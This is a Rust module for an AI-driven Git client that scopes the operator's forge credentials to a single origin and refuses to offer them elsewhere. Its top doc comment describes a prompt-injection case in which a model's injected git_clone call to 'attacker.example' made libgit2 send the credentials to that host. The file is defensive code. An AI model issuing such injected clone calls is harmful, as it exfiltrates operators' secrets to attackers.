//! Where this client's `username` / `password` may go.
//!
//! The credentials are startup parameters — the forge password or token the operator gave
//! this client for the repository it was opened on. libgit2 asks for them through a
//! callback that names the URL being contacted, and until September 2026 the callback
//! ignored that URL: `git_clone`, `git_fetch` and `git_pull` are open to the model (only
//! pushes are gated by `allow_remote_writes`), so a model answering a prompt-injected
//! `git_clone {"url": "https://attacker.example/x.git"}` met a 401 there and libgit2
//! posted the operator's credentials to it.
//!
//! A [`CredentialScope`] binds the pair to one origin — the `scheme://host[:port]` of the
//! client's `remote_addr`, or of the opened repository's `origin` remote when
//! `remote_addr` is a local path — and the callback refuses, by name, to offer them to any
//! other. A client whose credentials cannot be bound to a host offers them nowhere.

use git2::{Cred, RemoteCallbacks};
use tracing::warn;

/// A username/password pair and the one origin it may be offered to.
#[derive(Debug, Clone)]
pub struct CredentialScope {
    pub username: String,
    pub password: String,
    /// `scheme://host[:port]`, as [`remote_origin`] renders it.
    pub origin: String,
}

impl CredentialScope {
    /// Bind `username`/`password` to the origin of `remote_url`. `None` when either half
    /// is missing or the URL names no host — a local path, for instance.
    pub fn bind(
        username: Option<&str>,
        password: Option<&str>,
        remote_url: Option<&str>,
    ) -> Option<Self> {
        let (username, password) = (username?, password?);
        let origin = remote_origin(remote_url?)?;
        Some(Self {
            username: username.to_string(),
            password: password.to_string(),
            origin,
        })
    }

    /// Whether `url` is on this scope's origin.
    pub fn allows(&self, url: &str) -> bool {
        remote_origin(url).as_deref() == Some(self.origin.as_str())
    }
}

/// `scheme://host[:port]` of a Git remote URL, host lowercased, userinfo dropped.
///
/// Handles the URL forms (`https://`, `http://`, `git://`, `ssh://`) and the scp-like
/// `user@host:path`, which is `ssh://host`. A local path, `file://` URL or anything without
/// a host is `None`: it names no peer to send a credential to.
pub fn remote_origin(url: &str) -> Option<String> {
    if let Some((scheme, rest)) = url.split_once("://") {
        let scheme = scheme.to_ascii_lowercase();
        if scheme == "file" {
            return None;
        }
        let authority = rest.split('/').next()?;
        let host_port = authority.rsplit('@').next()?;
        return normalise_host_port(&scheme, host_port);
    }
    // scp-like: `git@github.com:owner/repo.git` — a colon before any slash, and no
    // drive-letter or absolute-path shape.
    let colon = url.find(':')?;
    let slash = url.find('/').unwrap_or(usize::MAX);
    if colon == 0 || slash < colon || url.starts_with('.') {
        return None;
    }
    let host = url[..colon].rsplit('@').next()?;
    // `C:/repos/x` is a drive, not a host: git treats a one-letter prefix the same way.
    if host.is_empty() || host.len() == 1 || host.contains(char::is_whitespace) {
        return None;
    }
    Some(format!("ssh://{}", host.to_ascii_lowercase()))
}

fn normalise_host_port(scheme: &str, host_port: &str) -> Option<String> {
    let (host, port) = if let Some(rest) = host_port.strip_prefix('[') {
        let end = rest.find(']')?;
        let host = &rest[..end];
        let port = rest[end + 1..].strip_prefix(':');
        (format!("[{host}]"), port)
    } else {
        match host_port.rsplit_once(':') {
            Some((h, p)) if p.bytes().all(|b| b.is_ascii_digit()) => (h.to_string(), Some(p)),
            _ => (host_port.to_string(), None),
        }
    };
    if host.is_empty() {
        return None;
    }
    let host = host.to_ascii_lowercase();
    let default = match scheme {
        "http" => Some("80"),
        "https" => Some("443"),
        "git" => Some("9418"),
        "ssh" => Some("22"),
        _ => None,
    };
    match port {
        Some(p) if Some(p) != default && !p.is_empty() => Some(format!("{scheme}://{host}:{p}")),
        _ => Some(format!("{scheme}://{host}")),
    }
}

/// The libgit2 callbacks for one network operation: credentials offered to the scope's
/// origin and refused everywhere else. With no scope, nothing is offered and libgit2
/// reports the server's 401 as it is.
pub fn remote_callbacks(scope: Option<&CredentialScope>) -> RemoteCallbacks<'static> {
    let mut callbacks = RemoteCallbacks::new();
    if let Some(scope) = scope {
        let scope = scope.clone();
        callbacks.credentials(move |url, _username_from_url, _allowed_types| {
            if scope.allows(url) {
                Cred::userpass_plaintext(&scope.username, &scope.password)
            } else {
                let asked = remote_origin(url).unwrap_or_else(|| url.to_string());
                warn!(
                    "Git client refused to offer its credentials to {} (bound to {})",
                    asked, scope.origin
                );
                Err(git2::Error::from_str(&format!(
                    "this client's credentials are bound to {} and are not offered to {}; \
                     open a client for that host if you mean to authenticate there",
                    scope.origin, asked
                )))
            }
        });
    }
    callbacks
}
